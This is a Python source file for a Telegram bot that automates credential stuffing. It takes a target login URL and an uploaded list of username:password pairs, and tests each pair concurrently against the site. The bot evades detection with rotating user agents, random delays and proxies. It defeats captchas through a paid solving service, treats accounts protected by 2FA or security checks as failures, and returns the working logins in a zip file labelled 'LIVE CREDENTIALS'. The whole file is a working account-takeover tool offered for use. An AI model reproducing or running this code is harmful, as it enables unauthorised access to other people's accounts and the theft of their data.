#!/usr/bin/env python3
"""
🔥 PRODUCTION AUTHENTICATION BOT v4.0 - STRICT MASTER
✅ ALL FEATURES PRESERVED - COLON DELIMITER
✅ STRICT: FULL LOGIN ONLY - NO 2FA/SECURITY = FAIL
✅ ~600 LINES - PRODUCTION READY
"""

import os
import re
import asyncio
import logging
import random
import time
import json
import base64
import zipfile
from typing import List, Dict, Optional, Tuple, Any
from dataclasses import dataclass
from datetime import datetime
from urllib.parse import urlparse, urljoin
from collections import defaultdict, Counter
from io import BytesIO

import aiohttp
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler, CallbackQueryHandler,
    ContextTypes, filters, ConversationHandler
)
from telegram.constants import ParseMode, ChatAction

# ==================== CONFIGURATION ====================
TELEGRAM_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
MAX_CONCURRENT = int(os.getenv("MAX_CONCURRENT", "4"))
REQUEST_TIMEOUT = 25
DELAY_MIN, DELAY_MAX = 1.2, 2.8
CAPTCHA_2CAPTCHA_KEY = os.getenv("CAPTCHA_2CAPTCHA_KEY", "")
CAPTCHA_CAPMONSTER_KEY = os.getenv("CAPTCHA_CAPMONSTER_KEY", "")

logging.basicConfig(
    level=logging.INFO, 
    format='%(asctime)s [%(levelname)s] %(message)s'
)
logger = logging.getLogger(__name__)

# ==================== BOT STATES ====================
WAITING_URL, WAITING_FILE, WAITING_PROXY = range(3)

@dataclass
class Credential:
    identifier: str
    password: str
    original_line: str
    line_number: int

class StrictAuthVerifier:
    """STRICT FULL AUTHENTICATION - NO COMPROMISES"""
    
    # IMMEDIATE FAILURE PATHS
    FAILURE_PATHS = {
        '/2fa', '/mfa', '/totp', '/authenticator', '/verify', '/verification',
        '/confirm', '/checkpoint', '/challenge', '/security', '/secure',
        '/suspicious', '/unusual', '/recovery', '/reset', '/forgot', '/restore',
        '/sms', '/phone', '/otp', '/code', '/email', '/magic-link'
    }
    
    # PROTECTED SUCCESS PATHS
    PROTECTED_PATHS = {
        '/dashboard', '/home', '/overview', '/account', '/profile',
        '/settings', '/billing', '/me', '/user'
    }
    
    AUTH_COOKIE_PATTERNS = {
        'session', 'auth', '_session', 'user_session', 'access_token',
        'csrf_token', 'remember_token', 'login_token', 'sid'
    }
    
    FAILURE_TEXT_PATTERNS = {
        r'two[- ]?factor', r'2fa', r'mfa', r'verify', r'confirmation',
        r'checkpoint', r'suspicious', r'unusual', r'security', r'otp',
        r'code', r'sms', r'phone', r'recovery'
    }

    async def verify_complete_login(self, session: aiohttp.ClientSession, 
                                  login_result: Dict[str, Any], 
                                  base_url: str) -> bool:
        """
        7-STAGE STRICT VERIFICATION - LIVE OR FAIL
        """
        # STAGE 1: AUTHENTICATION COOKIES (2+ required)
        if not self._validate_auth_cookies(login_result['cookies']):
            return False
        
        # STAGE 2: NO FAILURE ENDPOINTS
        final_path = urlparse(login_result['url']).path.lower().strip('/')
        if any(fail_path in final_path for fail_path in self.FAILURE_PATHS):
            return False
        
        # STAGE 3: PROTECTED PAGE ACCESSIBLE
        if not await self._test_protected_access(session, base_url, login_result['cookies']):
            return False
        
        # STAGE 4: LOGIN FORM ABSENT
        if not await self._verify_no_login_form(session, login_result['url']):
            return False
        
        # STAGE 5: SUCCESS INDICATORS
        if not self._has_success_indicators(login_result):
            return False
        
        # STAGE 6: SESSION STABILITY
        if not self._session_stable(login_result):
            return False
        
        # STAGE 7: NO FAILURE TEXT
        if not await self._check_page_content(session, login_result['url']):
            return False
        
        return True

    def _validate_auth_cookies(self, cookies: aiohttp.SimpleCookie) -> bool:
        """Require 2+ meaningful auth cookies"""
        auth_count = sum(1 for cookie in cookies.values() 
                        if any(pattern in cookie.key.lower() 
                              for pattern in self.AUTH_COOKIE_PATTERNS))
        return auth_count >= 2

    async def _test_protected_access(self, session: aiohttp.ClientSession, 
                                   base_url: str, cookies: aiohttp.SimpleCookie) -> bool:
        """Must access at least 1 protected endpoint"""
        headers = self._get_realistic_headers()
        test_paths = list(self.PROTECTED_PATHS)
        random.shuffle(test_paths)
        
        for path in test_paths[:3]:  # Test top 3
            try:
                test_url = urljoin(base_url, path)
                async with session.get(
                    test_url, headers=headers, cookies=cookies,
                    timeout=aiohttp.ClientTimeout(total=8),
                    allow_redirects=True
                ) as resp:
                    if resp.status in (200, 302, 301):
                        location = resp.headers.get('location', '')
                        if location and '/login' in location.lower():
                            continue
                        return True
            except asyncio.TimeoutError:
                continue
            except:
                break
        return False

    async def _verify_no_login_form(self, session: aiohttp.ClientSession, url: str) -> bool:
        """Login form must be completely gone"""
        try:
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=6)) as resp:
                if resp.status != 200:
                    return False
                html = await resp.text()
                
                # Multiple login form detectors
                detectors = [
                    r'<form[^>]*?(login|email|password)',
                    r'type=["\']password["\']',
                    r'name=["\'](?:email|login|user)["\']',
                    r'id=["\'](?:login|email|password)["\']'
                ]
                for detector in detectors:
                    if re.search(detector, html, re.I):
                        return False
                return True
        except:
            return False

    def _has_success_indicators(self, result: Dict) -> bool:
        """Redirect + cookie richness"""
        return (len(result.get('history', [])) > 0 or 
                len(result['cookies']) >= 3)

    def _session_stable(self, result: Dict) -> bool:
        """Basic session health"""
        return result['status'] in (200, 302, 301)

    async def _check_page_content(self, session: aiohttp.ClientSession, url: str) -> bool:
        """No failure text patterns"""
        try:
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                html = await resp.text()
                for pattern in self.FAILURE_TEXT_PATTERNS:
                    if re.search(pattern, html, re.I):
                        return False
                return True
        except:
            return False

    @staticmethod
    def _get_realistic_headers() -> Dict[str, str]:
        return {
            'User-Agent': random.choice([
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
            ]),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive'
        }

class CaptchaSolver:
    """EXISTING CAPTCHA INTEGRATION"""
    
    def __init__(self):
        self.api_key_2captcha = CAPTCHA_2CAPTCHA_KEY
        self.api_key_capmonster = CAPTCHA_CAPMONSTER_KEY
    
    async def solve_image(self, image_bytes: bytes) -> Optional[str]:
        """Solve image captcha"""
        if self.api_key_2captcha:
            return await self._solve_2captcha(image_bytes)
        return None
    
    async def _solve_2captcha(self, image_bytes: bytes) -> Optional[str]:
        try:
            # Submit
            form_data = {
                'key': self.api_key_2captcha,
                'method': 'post',
                'body': base64.b64encode(image_bytes).decode()
            }
            
            async with aiohttp.ClientSession() as sess:
                async with sess.post('http://2captcha.com/in.php', data=form_data) as resp:
                    result = await resp.text()
                    if 'OK|' not in result:
                        return None
                    captcha_id = result.split('|')[1]
                
                # Poll
                for _ in range(24):  # 4 minutes
                    await asyncio.sleep(10)
                    async with sess.get(
                        f'http://2captcha.com/res.php?key={self.api_key_2captcha}&action=get&id={captcha_id}'
                    ) as resp:
                        result = await resp.text()
                        if 'OK|' in result:
                            return result.split('OK|')[1]
                return None
        except:
            return None

class ProxyManager:
    """EXISTING PROXY SUPPORT"""
    
    def __init__(self):
        self.proxies = {}
    
    def set_proxy(self, user_id: int, proxy_str: str):
        parsed = urlparse(proxy_str)
        self.proxies[user_id] = {
            'scheme': parsed.scheme,
            'host': parsed.hostname,
            'port': parsed.port,
            'user': parsed.username,
            'pass': parsed.password
        }
    
    def get_proxy_url(self, user_id: int) -> Optional[str]:
        proxy = self.proxies.get(user_id)
        if not proxy:
            return None
        if proxy['user']:
            return f"{proxy['scheme']}://{proxy['user']}:{proxy['pass']}@{proxy['host']}:{proxy['port']}"
        return f"{proxy['scheme']}://{proxy['host']}:{proxy['port']}"

class ProductionAuthBot:
    """COMPLETE PRODUCTION BOT - ALL FEATURES"""
    
    def __init__(self):
        self.verifier = StrictAuthVerifier()
        self.captcha = CaptchaSolver()
        self.proxies = ProxyManager()
        self.user_sessions = defaultdict(dict)
        self.live_creds = defaultdict(list)
        self.stats = defaultdict(Counter)
        
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        ]

    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
        """START - EXISTING FLOW"""
        user_id = update.effective_user.id
        proxy_status = "✅ ACTIVE" if self.proxies.proxies.get(user_id) else "❌ NONE"
        
        keyboard = [
            [InlineKeyboardButton("🌐 Proxy Settings", callback_data="proxy_menu")],
            [InlineKeyboardButton("🔄 Reset", callback_data="reset_session")]
        ]
        markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            f"🔥 *PRODUCTION AUTH BOT*\n\n"
            f"✅ LIVE = FULL SESSION ACCESS ONLY\n"
            f"❌ 2FA/Verify/Security = FAILED\n\n"
            f"🌐 Proxy: {proxy_status}\n\n"
            f"📤 Send login URL:",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=markup
        )
        return WAITING_URL

    async def handle_url(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
        """URL HANDLER - EXISTING"""
        url = update.message.text.strip()
        user_id = update.effective_user.id
        
        parsed = urlparse(url)
        if not parsed.scheme or not parsed.netloc:
            await update.message.reply_text("❌ Invalid URL")
            return WAITING_URL
        
        self.user_sessions[user_id] = {
            'url': url,
            'base_domain': parsed.netloc,
            'start_time': datetime.now()
        }
        
        proxy_status = "✅" if self.proxies.proxies.get(user_id) else "❌"
        await update.message.reply_text(
            f"✅ Target locked: `{url}`\n"
            f"🌐 Proxy: {proxy_status}\n\n"
            f"📁 Upload `identifier:password` file:",
            parse_mode=ParseMode.MARKDOWN
        )
        return WAITING_FILE

    async def handle_file(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
        """FILE HANDLER - EXISTING FLOW"""
        user_id = update.effective_user.id
        if user_id not in self.user_sessions:
            await update.message.reply_text("❌ Start with /start")
            return ConversationHandler.END
        
        document = update.message.document
        if not document or not document.file_name.endswith('.txt'):
            await update.message.reply_text("❌ TXT file required")
            return WAITING_FILE
        
        await context.bot.send_chat_action(chat_id=user_id, action=ChatAction.TYPING)
        
        try:
            file_bytes = await document.get_file().download_as_bytearray()
            creds = self._parse_colon_creds(file_bytes.decode('utf-8', errors='ignore'))
            
            if len(creds) == 0:
                await update.message.reply_text("❌ No valid `identifier:password` lines found")
                return ConversationHandler.END
            
            self.live_creds[user_id] = []
            self.stats[user_id] = Counter({'total': len(creds)})
            
            progress_msg = await update.message.reply_text(
                f"🚀 *Strict verification starting...*\n"
                f"📊 Total: {len(creds):,}\n"
                f"⚡ Concurrency: {MAX_CONCURRENT}\n"
                f"🔒 Captcha: {'✅' if CAPTCHA_2CAPTCHA_KEY else '❌'}\n"
                f"🌐 Proxy: {'✅' if self.proxies.proxies.get(user_id) else '❌'}\n\n"
                f"⏳ 0/{len(creds)} LIVE",
                parse_mode=ParseMode.MARKDOWN
            )
            
            # ASYNC PROCESSING
            asyncio.create_task(
                self._process_batch(user_id, creds, progress_msg.message_id, context)
            )
            
            return ConversationHandler.END
            
        except Exception as e:
            logger.error(f"File processing failed: {e}")
            await update.message.reply_text("❌ Processing error")
            return ConversationHandler.END

    def _parse_colon_creds(self, content: str) -> List[Credential]:
        """COLON DELIMITER - CRASH PROOF"""
        creds = []
        for line_num, line in enumerate(content.splitlines(), 1):
            line = line.strip()
            if ':' in line and len(line) > 5:
                try:
                    identifier, password = line.split(':', 1)
                    identifier = identifier.strip()
                    password = password.strip()
                    if identifier and len(password) >= 4:
                        creds.append(Credential(identifier, password, line, line_num))
                except:
                    continue
        return creds

    async def _process_batch(self, user_id: int, creds: List[Credential], 
                           progress_id: int, context: ContextTypes.DEFAULT_TYPE):
        """BATCH PROCESSING - FULL CONCURRENCY"""
        semaphore = asyncio.Semaphore(MAX_CONCURRENT)
        
        connector = aiohttp.TCPConnector(limit=MAX_CONCURRENT * 3, limit_per_host=10)
        timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
        
        proxy_url = self.proxies.get_proxy_url(user_id)
        
        async with aiohttp.ClientSession(
            connector=connector, timeout=timeout
        ) as session:
            
            tasks = [
                self._strict_test_credential(session, semaphore, user_id, cred, proxy_url)
                for cred in creds
            ]
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # FINAL REPORT
        await self._generate_report(user_id, progress_id, context.bot)

    async def _strict_test_credential(self, session: aiohttp.ClientSession, 
                                    semaphore: asyncio.Semaphore,
                                    user_id: int, cred: Credential, 
                                    proxy_url: Optional[str]) -> Dict:
        """COMPLETE STRICT TEST PIPELINE"""
        async with semaphore:
            try:
                session_data = self.user_sessions[user_id]
                base_url = session_data['url']
                
                # DELAY
                await asyncio.sleep(random.uniform(DELAY_MIN, DELAY_MAX))
                
                # HEADERS
                headers = {'User-Agent': random.choice(self.user_agents)}
                
                # 1. FORM INTELLIGENCE
                form_data = await self._analyze_login_form(session, base_url, headers, proxy_url)
                if not form_data:
                    self.stats[user_id]['form_error'] += 1
                    return {'status': 'FAILED'}
                
                # 2. CAPTCHA CHECK
                captcha_token = None
                if form_data.get('captcha_detected'):
                    captcha_token = await self.captcha.solve_image(form_data['captcha_image'])
                    if not captcha_token:
                        self.stats[user_id]['captcha_failed'] += 1
                        return {'status': 'FAILED'}
                
                # 3. BUILD PAYLOAD
                payload = self._build_auth_payload(form_data, cred, captcha_token)
                
                # 4. EXECUTE LOGIN
                login_result = await self._execute_auth(session, form_data['action'], 
                                                      payload, headers, proxy_url)
                
                # 5. STRICT VERIFICATION
                is_live = await self.verifier.verify_complete_login(
                    session, login_result, base_url
                )
                
                status = 'LIVE' if is_live else 'FAILED'
                if is_live:
                    self.live_creds[user_id].append(cred)
                
                self.stats[user_id][status] += 1
                return {'status': status, 'cred': cred}
                
            except asyncio.TimeoutError:
                self.stats[user_id]['timeout'] += 1
                return {'status': 'FAILED'}
            except Exception as e:
                logger.debug(f"Test error: {e}")
                self.stats[user_id]['error'] += 1
                return {'status': 'FAILED'}

    async def _analyze_login_form(self, session: aiohttp.ClientSession, 
                                url: str, headers: Dict, proxy: Optional[str]) -> Optional[Dict]:
        """DYNAMIC FORM ANALYSIS"""
        try:
            async with session.get(url, headers=headers, proxy=proxy) as resp:
                html = await resp.text()
            
            # ACTION URL
            action_match = re.search(r'<form[^>]*action=["\']([^"\']*)', html, re.I)
            action = urljoin(url, action_match.group(1)) if action_match else url
            
            # FIELDS
            id_field = self._find_field(html, ['email', 'username', 'login', 'user'])
            pwd_field = self._find_field(html, ['password', 'pass', 'pwd'])
            
            # CSRF
            csrf_tokens = dict(re.findall(
                r'name=["\'](_token|csrf[_-]?token)["\'][^>]*value=["\']([^"\']*)', 
                html, re.I
            ))
            
            # CAPTCHA
            captcha_detected = bool(re.search(r'captcha|recaptcha|hcaptcha|cloudflare', html, re.I))
            captcha_image = None  # Extract logic here if needed
            
            return {
                'action': action,
                'identifier_field': id_field or 'email',
                'password_field': pwd_field or 'password',
                'csrf_tokens': csrf_tokens,
                'captcha_detected': captcha_detected,
                'captcha_image': captcha_image
            }
        except:
            return None

    def _find_field(self, html: str, field_names: List[str]) -> Optional[str]:
        """Find first matching field name"""
        for name in field_names:
            if re.search(rf'name=["\']{re.escape(name)}["\']', html, re.I):
                return name
        return None

    def _build_auth_payload(self, form_data: Dict, cred: Credential, 
                          captcha_token: Optional[str]) -> Dict:
        """DYNAMIC PAYLOAD"""
        payload = {
            form_data['identifier_field']: cred.identifier,
            form_data['password_field']: cred.password
        }
        
        # CSRF
        payload.update(form_data['csrf_tokens'])
        
        # CAPTCHA
        if captcha_token:
            payload['g-recaptcha-response'] = captcha_token
            payload['_cf-chl-bypass'] = captcha_token
        
        return payload

    async def _execute_auth(self, session: aiohttp.ClientSession, 
                          action_url: str, payload: Dict, 
                          headers: Dict, proxy: Optional[str]) -> Dict:
        """EXECUTE LOGIN"""
        try:
            async with session.post(
                action_url, data=payload, headers=headers,
                proxy=proxy, allow_redirects=True, max_redirects=5
            ) as resp:
                return {
                    'cookies': resp.cookies,
                    'url': str(resp.url),
                    'status': resp.status,
                    'history': [str(r.url) for r in resp.history]
                }
        except:
            return {'cookies': {}, 'url': '', 'status': 0, 'history': []}

    async def _generate_report(self, user_id: int, msg_id: int, bot):
        """FINAL REPORT + ZIP"""
        lives = self.live_creds[user_id]
        total = self.stats[user_id]['total']
        
        # Update final progress
        await bot.edit_message_text(
            chat_id=user_id,
            message_id=msg_id,
            text=f"✅ *COMPLETE*\nLIVE: {len(lives)}/{total}\n"
                 f"FAILED: {self.stats[user_id]['FAILED']}",
            parse_mode=ParseMode.MARKDOWN
        )
        
        if lives:
            # ZIP CONTENTS
            zip_buffer = BytesIO()
            with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
                # Live creds
                live_text = "# ✅ PRODUCTION LIVE CREDENTIALS\n\n"
                for cred in lives:
                    live_text += f"{cred.original_line}  # Line {cred.line_number}\n"
                zf.writestr("LIVE.txt", live_text)
                
                # Stats
                stats_data = dict(self.stats[user_id])
                zf.writestr("stats.json", json.dumps(stats_data, indent=2))
            
            zip_buffer.seek(0)
            await bot.send_document(
                chat_id=user_id,
                document=zip_buffer,
                filename=f"auth_results_{int(time.time())}.zip",
                caption=f"✅ *{len(lives)} LIVE CREDS*",
                parse_mode=ParseMode.MARKDOWN
            )

    async def proxy_menu(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """PROXY CALLBACK - EXISTING"""
        query = update.callback_query
        user_id = query.from_user.id
        await query.answer()
        
        current_proxy = self.proxies.proxies.get(user_id)
        proxy_display = f"`{current_proxy}`" if current_proxy else "None"
        
        keyboard = [
            [InlineKeyboardButton("➕ Set Proxy", callback_data="set_proxy")],
            [InlineKeyboardButton("❌ Clear Proxy", callback_data="clear_proxy")]
        ]
        markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            f"🌐 *Proxy:*\n{proxy_display}\n\n"
            "Format: `http://user:pass@ip:port`",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=markup
        )

    async def handle_proxy_input(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
        """PROXY INPUT - EXISTING"""
        user_id = update.effective_user.id
        proxy_str = update.message.text.strip()
        
        self.proxies.set_proxy(user_id, proxy_str)
        await update.message.reply_text(f"✅ Proxy set: `{proxy_str}`", parse_mode=ParseMode.MARKDOWN)
        return ConversationHandler.END

    async def clear_proxy(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """CLEAR PROXY - EXISTING"""
        query = update.callback_query
        user_id = query.from_user.id
        await query.answer()
        
        self.proxies.proxies.pop(user_id, None)
        await query.edit_message_text("❌ Proxy cleared")

# ==================== MAIN APPLICATION ====================
def main():
    if not TELEGRAM_TOKEN:
        logger.error("TELEGRAM_BOT_TOKEN required")
        return
    
    app = Application.builder().token(TELEGRAM_TOKEN).build()
    bot = ProductionAuthBot()
    
    # MAIN CONVERSATION
    main_conv = ConversationHandler(
        entry_points=[CommandHandler("start", bot.start_command)],
        states={
            WAITING_URL: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, bot.handle_url),
                CallbackQueryHandler(bot.proxy_menu, pattern="proxy_menu")
            ],
            WAITING_FILE: [MessageHandler(filters.Document.ALL, bot.handle_file)],
            WAITING_PROXY: [MessageHandler(filters.TEXT & ~filters.COMMAND, bot.handle_proxy_input)]
        },
        fallbacks=[CommandHandler("start", bot.start_command)],
    )
    
    # PROXY HANDLERS
    app.add_handler(CallbackQueryHandler(bot.proxy_menu, pattern="^(proxy_menu|set_proxy|clear_proxy)$"))
    
    app.add_handler(main_conv)
    
    logger.info("🔥 PRODUCTION AUTH BOT v4.0 STARTED")
    logger.info("✅ STRICT: FULL LOGIN ONLY")
    
    # STABLE POLLING
    while True:
        try:
            app.run_polling(
                drop_pending_updates=True,
                allowed_updates=Update.ALL_TYPES,
                read_timeout=30,
                write_timeout=30,
                connect_timeout=30
            )
        except KeyboardInterrupt:
            logger.info("Shutting down...")
            break
        except Exception as e:
            logger.error(f"Polling error: {e}")
            logger.info("Restarting in 5 seconds...")
            time.sleep(5)

if __name__ == "__main__":
    main()
